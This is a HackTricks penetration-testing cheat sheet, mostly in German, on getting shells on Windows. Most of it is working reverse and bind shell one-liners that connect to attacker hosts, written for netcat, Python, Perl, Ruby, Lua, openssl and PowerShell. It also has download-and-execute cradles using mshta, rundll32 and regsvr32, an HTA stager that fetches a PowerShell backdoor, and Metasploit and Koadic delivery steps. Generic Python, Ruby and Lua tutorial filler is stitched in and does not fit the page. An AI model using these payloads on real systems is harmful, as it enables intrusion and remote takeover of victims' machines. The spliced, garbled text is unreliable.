# Shells - Windows

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Die Seite [lolbas-project.github.io](https://lolbas-project.github.io/) ist für Windows ähnlich wie [https://gtfobins.github.io/](https://gtfobins.github.io/) für Linux.\
Offensichtlich gibt es in Windows **keine SUID-Dateien oder sudo-Berechtigungen**, aber es ist nützlich zu wissen, **wie** einige **Binärdateien** missbraucht werden können, um unerwartete Aktionen wie das **Ausführen von beliebigem Code** durchzuführen.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) ist eine portable und sichere Alternative zu Netcat**. Es funktioniert auf Unix-ähnlichen Systemen und Win32. Mit Funktionen wie starker Verschlüsselung, Programm-Ausführung, anpassbaren Quellports und kontinuierlicher Wiederverbindung bietet sbd eine vielseitige Lösung für TCP/IP-Kommunikation. Für Windows-Benutzer kann die sbd.exe-Version aus der Kali Linux-Distribution als zuverlässiger Ersatz für Netcat verwendet werden.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python is a versatile and powerful programming language that is commonly used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the key features and techniques of Python that are relevant to hacking.

### Interacting with the Operating System

Python provides several modules that allow you to interact with the underlying operating system. These modules can be used to execute system commands, navigate the file system, and perform other system-related tasks. Some of the commonly used modules for interacting with the operating system include `os`, `subprocess`, and `shutil`.

### Network Programming

Python's built-in `socket` module allows you to create network connections and communicate with remote systems. This makes it a valuable tool for tasks such as port scanning, network reconnaissance, and exploiting network vulnerabilities. Additionally, Python provides libraries like `requests` and `urllib` that simplify HTTP requests and web scraping.

### Exploiting Vulnerabilities

Python can be used to exploit various vulnerabilities in software and systems. The `pwntools` library, for example, provides a set of tools and utilities for binary exploitation. Additionally, Python's `paramiko` library allows you to automate SSH connections and perform tasks like password cracking and brute-forcing.

### Web Application Hacking

Python is widely used for web application hacking due to its simplicity and versatility. The `requests` library, for instance, allows you to send HTTP requests and interact with web applications. Python frameworks like `Flask` and `Django` can be used to build and test web applications, making them ideal for penetration testing and vulnerability assessment.

### Reverse Engineering

Python can also be used for reverse engineering tasks. The `pycrypto` library, for example, provides cryptographic functions that can be used to analyze and manipulate encrypted data. Additionally, Python's `struct` module allows you to parse binary data and extract information from files.

### Automating Tasks

Python's simplicity and ease of use make it an ideal language for automating repetitive tasks. Whether it's automating the process of scanning for vulnerabilities or performing brute-force attacks, Python can help streamline and accelerate these tasks. Libraries like `selenium` and `pyautogui` can be used for automating web interactions and GUI-based tasks.

### Conclusion

Python is a powerful language that can be used for a wide range of hacking tasks. Its versatility, extensive library support, and ease of use make it a popular choice among hackers and security professionals. By leveraging Python's capabilities, you can enhance your hacking skills and streamline your workflow.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl ist eine interpretierte, hochgradig flexible und leistungsstarke Skriptsprache, die häufig für die Entwicklung von Shell-Skripten verwendet wird. Es ist auf den meisten Windows-Systemen vorinstalliert und erfordert keine zusätzliche Installation.

### Ausführen von Perl-Skripten

Um ein Perl-Skript auf einem Windows-System auszuführen, öffnen Sie die Eingabeaufforderung und navigieren Sie zum Speicherort des Skripts. Geben Sie dann den Befehl `perl scriptname.pl` ein, wobei "scriptname.pl" der Name des Skripts ist.

### Interaktiver Perl-Modus

Perl bietet auch einen interaktiven Modus, der es Ihnen ermöglicht, Perl-Code direkt in der Eingabeaufforderung auszuführen. Geben Sie einfach den Befehl `perl -e "code"` ein, wobei "code" der auszuführende Perl-Code ist.

### Perl-Shell

Die Perl-Shell, auch bekannt als Perl-Interpreter, ermöglicht es Ihnen, Perl-Code direkt in einer interaktiven Umgebung auszuführen. Um die Perl-Shell zu starten, geben Sie einfach den Befehl `perl -d` in der Eingabeaufforderung ein.

### Perl-Module

Perl bietet eine Vielzahl von Modulen, die zusätzliche Funktionen und Bibliotheken für die Entwicklung von Skripten bereitstellen. Diese Module können über den CPAN (Comprehensive Perl Archive Network) heruntergeladen und installiert werden.

### Perl-Skripting für Hacking

Perl ist eine beliebte Sprache für Hacking-Aktivitäten auf Windows-Systemen. Es bietet eine breite Palette von Funktionen und Bibliotheken, die für verschiedene Hacking-Techniken verwendet werden können, wie z.B. das Durchführen von Netzwerkscans, das Extrahieren von Informationen aus Dateien und das Manipulieren von Daten.

### Perl-Ressourcen

- [Perl-Dokumentation](https://perldoc.perl.org/)
- [CPAN](https://www.cpan.org/) (Comprehensive Perl Archive Network)
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby ist eine dynamische, objektorientierte Programmiersprache, die für ihre Einfachheit und Lesbarkeit bekannt ist. Sie wird häufig für die Entwicklung von Webanwendungen verwendet und bietet eine Vielzahl von Funktionen und Bibliotheken, die das Programmieren erleichtern.

### Installation

Um Ruby auf einem Windows-System zu installieren, können Sie den RubyInstaller verwenden. Gehen Sie dazu wie folgt vor:

1. Besuchen Sie die offizielle Ruby-Website (https://www.ruby-lang.org/en/downloads/) und laden Sie die neueste Version des RubyInstallers herunter.
2. Führen Sie den heruntergeladenen Installer aus und folgen Sie den Anweisungen des Installationsassistenten.
3. Wählen Sie die Option "Add Ruby executables to your PATH" aus, um Ruby in Ihrem Systempfad hinzuzufügen.
4. Klicken Sie auf "Install", um die Installation abzuschließen.

### Interaktive Ruby-Shell (IRB)

Die Interaktive Ruby-Shell (IRB) ist ein nützliches Werkzeug zum Testen und Ausführen von Ruby-Code. Sie können die IRB öffnen, indem Sie "irb" in Ihrer Befehlszeile eingeben.

```ruby
$ irb
irb(main):001:0>
```

### Grundlegende Syntax

Ruby verwendet eine einfache und intuitive Syntax. Hier sind einige grundlegende Konzepte und Syntaxelemente:

#### Variablen

```ruby
name = "John"
age = 25
```

#### Ausgabe

```ruby
puts "Hello, World!"
```

#### Bedingungen

```ruby
if age >= 18
  puts "You are an adult."
else
  puts "You are a minor."
end
```

#### Schleifen

```ruby
for i in 1..5
  puts i
end
```

### Nützliche Ressourcen

- [Ruby-Dokumentation](https://ruby-doc.org/)
- [RubyGems](https://rubygems.org/) - Eine Sammlung von Ruby-Bibliotheken und -Programmen
- [Ruby on Rails](https://rubyonrails.org/) - Ein beliebtes Webframework, das auf Ruby basiert

Mit diesen Grundlagen können Sie mit Ruby beginnen und Ihre Fähigkeiten weiterentwickeln. Viel Spaß beim Programmieren!
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua ist eine leistungsstarke, effiziente und flexible Skriptsprache, die häufig für die Entwicklung von Spielen, Webanwendungen und eingebetteten Systemen verwendet wird. Sie zeichnet sich durch ihre einfache Syntax, ihre hohe Geschwindigkeit und ihre geringe Speicheranforderung aus.

### Lua-Shell

Die Lua-Shell ist eine interaktive Umgebung, die es Benutzern ermöglicht, Lua-Code direkt auszuführen und mit der Sprache zu experimentieren. Sie kann verwendet werden, um Skripte zu testen, Funktionen zu überprüfen und Prototypen zu erstellen.

#### Installation

Um die Lua-Shell zu verwenden, müssen Sie Lua auf Ihrem System installieren. Gehen Sie dazu wie folgt vor:

1. Laden Sie die neueste Version von Lua von der offiziellen Website herunter.
2. Entpacken Sie das heruntergeladene Archiv.
3. Navigieren Sie im Terminal zum extrahierten Verzeichnis.
4. Führen Sie den Befehl `make linux` aus, um Lua auf Linux zu kompilieren und zu installieren. Für andere Betriebssysteme finden Sie spezifische Anweisungen in der Dokumentation.

#### Verwendung

Nach der Installation können Sie die Lua-Shell öffnen, indem Sie den Befehl `lua` in Ihrem Terminal eingeben. Dadurch wird eine interaktive Umgebung gestartet, in der Sie Lua-Code eingeben und ausführen können.

Hier sind einige Beispiele für die Verwendung der Lua-Shell:

- Einfache Berechnungen:

```lua
> 2 + 2
4
> math.sqrt(16)
4
```

- Variablenzuweisung:

```lua
> x = 10
> print(x)
10
```

- Funktionen definieren und aufrufen:

```lua
> function greet(name)
>>     print("Hello, " .. name .. "!")
>> end
> greet("Alice")
Hello, Alice!
```

- Schleifen und Bedingungen:

```lua
> for i = 1, 5 do
>>     if i % 2 == 0 then
>>         print(i .. " is even")
>>     else
>>         print(i .. " is odd")
>>     end
>> end
1 is odd
2 is even
3 is odd
4 is even
5 is odd
```

- Externe Module laden:

```lua
> json = require("json")
> data = '{"name": "Alice", "age": 25}'
> obj = json.decode(data)
> print(obj.name)
Alice
```

Die Lua-Shell bietet eine Vielzahl von Funktionen und Möglichkeiten zur Interaktion mit der Lua-Sprache. Sie können die offizielle Dokumentation konsultieren, um weitere Informationen und Beispiele zu erhalten.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Angreifer (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the compromised system connects back to the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a reverse shell on a Windows system:

### Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell connection. The following command can be used to create a reverse shell using Netcat:

```bash
nc -e cmd.exe <attacker_ip> <port>
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### PowerShell

PowerShell is a powerful scripting language built into Windows. It can be used to create a reverse shell connection using the following command:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit is a popular framework for developing and executing exploits. It provides a wide range of modules, including ones for creating reverse shells on Windows systems. The following command can be used to create a reverse shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Bind Shells

A bind shell is a technique where the compromised system listens for incoming connections from the attacker's machine, allowing the attacker to execute commands on the compromised system. Here are a few methods to create a bind shell on a Windows system:

### Netcat

Netcat can also be used to create a bind shell connection. The following command can be used to create a bind shell using Netcat:

```bash
nc -lvp <port> -e cmd.exe
```

Replace `<port>` with the desired port number.

### PowerShell

PowerShell can also be used to create a bind shell connection. The following command can be used to create a bind shell using PowerShell:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Replace `<port>` with the desired port number.

### Metasploit

Metasploit provides modules for creating bind shells as well. The following command can be used to create a bind shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_bind_tcp
set LPORT <port>
exploit
```

Replace `<port>` with the desired port number.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the process of compromising a target. Reverse shells and bind shells provide attackers with remote access and control over the compromised system. It is important to understand these techniques in order to defend against them effectively.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell ist eine leistungsstarke Skriptsprache und Befehlszeileninterpreter, die von Microsoft entwickelt wurde. Sie bietet eine Vielzahl von Funktionen und ermöglicht es Hackern, komplexe Aufgaben auf Windows-Systemen auszuführen.

### Powershell-Remoting

Powershell-Remoting ermöglicht es Hackern, eine Verbindung zu entfernten Windows-Systemen herzustellen und Befehle auszuführen. Dies kann nützlich sein, um eine größere Anzahl von Systemen gleichzeitig zu übernehmen oder um auf Systeme zuzugreifen, die nicht direkt erreichbar sind.

Um eine Remoting-Verbindung herzustellen, kann der Befehl `Enter-PSSession` verwendet werden. Dies öffnet eine interaktive Sitzung auf dem entfernten System, in der der Hacker Befehle ausführen kann.

### Powershell-Skripte

Powershell-Skripte sind eine effektive Möglichkeit, wiederkehrende Aufgaben zu automatisieren. Hackern ermöglichen sie, komplexe Angriffe zu automatisieren und Zeit zu sparen.

Um ein Powershell-Skript auszuführen, kann der Befehl `.\skript.ps1` verwendet werden. Dies führt das Skript auf dem lokalen System aus.

### Powershell-Empire

Powershell-Empire ist ein leistungsstarkes Framework für die Post-Exploitation auf Windows-Systemen. Es bietet eine Vielzahl von Werkzeugen und Funktionen, die Hackern helfen, ihre Zugriffsrechte auf einem kompromittierten System zu erweitern.

Mit Powershell-Empire können Hacker beispielsweise Keylogger installieren, Screenshots aufnehmen, Passwörter stehlen und Daten exfiltrieren.

### Powershell-Obfuscation

Powershell-Obfuscation ist eine Technik, bei der der Code so umgeschrieben wird, dass er für Sicherheitslösungen schwer erkennbar ist. Dies ermöglicht es Hackern, ihre Angriffe zu tarnen und zu verhindern, dass der Code von Antivirenprogrammen erkannt wird.

Es gibt verschiedene Tools und Techniken, um Powershell-Code zu obfuskieren, einschließlich der Verwendung von Base64-Kodierung, der Verschleierung von Variablennamen und der Verwendung von verschlüsselten Payloads.

### Powershell-Privilege-Escalation

Powershell-Privilege-Escalation bezieht sich auf Techniken, mit denen ein Hacker seine Zugriffsrechte auf einem Windows-System erhöhen kann. Dies kann nützlich sein, um auf geschützte Ressourcen zuzugreifen oder um vollständige Kontrolle über das System zu erlangen.

Ein Beispiel für eine Privilege-Escalation-Technik ist die Verwendung von Powershell-Skripten, um Schwachstellen in Windows-Diensten auszunutzen und administrative Rechte zu erlangen.

### Powershell-Logging und -Detection

Powershell-Logging und -Detection bezieht sich auf Techniken, mit denen Sicherheitsteams verdächtige Aktivitäten in Powershell erkennen und darauf reagieren können. Dies kann helfen, Angriffe frühzeitig zu erkennen und Schäden zu begrenzen.

Einige Beispiele für Powershell-Logging- und -Detection-Techniken sind die Überwachung von Powershell-Ereignissen, die Analyse von Powershell-Protokollen und die Verwendung von Sicherheitslösungen, die Powershell-Angriffe erkennen und blockieren können.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Prozess, der Netzwerkanruf ausführt: **powershell.exe**\
Payload auf Festplatte geschrieben: **NEIN** (_zumindest nirgendwo gefunden, als ich procmon verwendet habe!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
Payload auf der Festplatte geschrieben: **WebDAV-Client-Lokalcache**

**Einzeiler:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Erhalten Sie weitere Informationen zu verschiedenen Powershell-Shells am Ende dieses Dokuments**

## Mshta

* [Von hier aus](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS Backdoors)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager hta verwenden**

#### hta Beispiel

[**Von hier aus**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Von hier aus**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows the execution of HTML applications (HTAs). It can be used as a vector for delivering malicious payloads. Metasploit provides a module called `exploit/windows/browser/mshta` that exploits vulnerabilities in the HTA execution process.

To use the `mshta` module in Metasploit, follow these steps:

1. Set the required options:
   - `SRVHOST`: The IP address of the Metasploit listening host.
   - `SRVPORT`: The port on which Metasploit is listening.
   - `URIPATH`: The path for the HTA file on the server.
   - `PAYLOAD`: The payload to be delivered.

2. Start the Metasploit multi/handler:
   ```
   use exploit/multi/handler
   set PAYLOAD <selected_payload>
   set LHOST <listening_host>
   set LPORT <listening_port>
   exploit
   ```

3. Generate the HTA file:
   ```
   use exploit/windows/browser/mshta
   set SRVHOST <listening_host>
   set SRVPORT <listening_port>
   set URIPATH <hta_file_path>
   exploit
   ```

4. Deliver the HTA file to the target and wait for the payload to execute.

Remember to always use these techniques responsibly and with proper authorization.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Von Defender erkannt**




## **Rundll32**

[**Dll Hello World Beispiel**](https://github.com/carterjones/hello-world-dll)

* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Von Defender erkannt**

**Rundll32 - sct**

[**Von hier aus**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/local/hta_print_uaf` that leverages the Rundll32 utility to execute malicious code.

To use this module, follow these steps:

1. Set the required options:
   - `SESSION`: The session to run the exploit on.
   - `PAYLOAD`: The payload to execute.
   - `DLL`: The DLL file to load.

2. Run the exploit by executing the `exploit` command.

Once the exploit is successful, the specified payload will be executed using the Rundll32 utility. This technique can be used to gain unauthorized access to a target system and perform various malicious activities.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that uses Rundll32 to load a malicious DLL file and gain control over a compromised system.

To use Koadic, first, generate a malicious DLL payload using the Koadic framework. This payload can be customized to perform various actions, such as establishing a reverse shell or executing commands on the target system.

Once the payload is generated, it can be loaded using Rundll32. The following command can be used to execute the payload:

```
rundll32.exe <path_to_malicious_dll>,<entry_point>
```

Replace `<path_to_malicious_dll>` with the path to the generated DLL file and `<entry_point>` with the desired entry point within the DLL. The entry point is typically a function that will be executed when the DLL is loaded.

By executing the above command, the malicious DLL payload will be loaded and executed, allowing the attacker to gain control over the compromised system.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security vulnerabilities and to promote responsible and ethical hacking practices.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Von Defender erkannt**

#### Regsvr32 -sct

[Von hier aus](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility that is used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system. In this case, we will explore how to use Regsvr32 with Metasploit to gain remote access to a Windows machine.

##### **Step 1: Generate the Payload**

First, we need to generate a payload using Metasploit. This payload will be executed on the target machine when we run the Regsvr32 command. To generate the payload, open a terminal and enter the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the reverse connection.

##### **Step 2: Set Up the Listener**

Next, we need to set up a listener in Metasploit to receive the connection from the target machine. Open Metasploit by entering `msfconsole` in the terminal. Once Metasploit is open, enter the following command to set up the listener:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```

Again, replace `<attacker IP>` and `<attacker port>` with your IP address and the port you specified in Step 1.

##### **Step 3: Execute the Payload**

Now that the listener is set up, we can execute the payload on the target machine using the Regsvr32 command. Open a command prompt on the target machine and enter the following command:

```
regsvr32 /s /n /u /i:<payload.dll> scrobj.dll
```

Replace `<payload.dll>` with the path to the payload file generated in Step 1.

Once the command is executed, the payload will be executed on the target machine and a connection will be established with your listener in Metasploit. You will now have remote access to the target machine.

##### **Conclusion**

Using Regsvr32 with Metasploit can be an effective technique for gaining remote access to a Windows machine. However, it is important to note that this technique relies on social engineering or exploiting vulnerabilities to trick the user into executing the command. It is essential to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
